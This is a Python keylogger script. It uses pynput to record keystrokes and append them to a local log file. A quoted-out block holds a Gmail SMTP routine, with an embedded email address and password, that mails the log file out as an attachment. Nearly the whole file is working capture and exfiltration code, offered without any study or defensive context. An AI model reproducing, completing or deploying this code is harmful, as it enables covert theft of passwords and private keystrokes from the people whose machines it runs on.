# Imports
import pynput
from pynput.keyboard import Key, Listener

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

fxl = "log.txt"
file_path = "C:\\Users\\7355865\\PycharmProjects\\pythonProject"
extend = "\\"
# ----------------------------------------------------------
'''email_address = "tergozen@gmail.com"
password = "ANTESCHIZIDUS-COGNITO CONTINUUM"

toaddr = "tergozen@gmail.com"

def send_email(filename,  attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File - 000041 | Welcome, Opherus."

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(fxl, file_path + extend + fxl, toaddr)'''
# ----------------------------------------------------------

count = 0
keys = []


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        wrfile(keys)
        keys = []


def wrfile(keys):
    with open(file_path + extend + fxl, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("Key.space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("goodnight world")

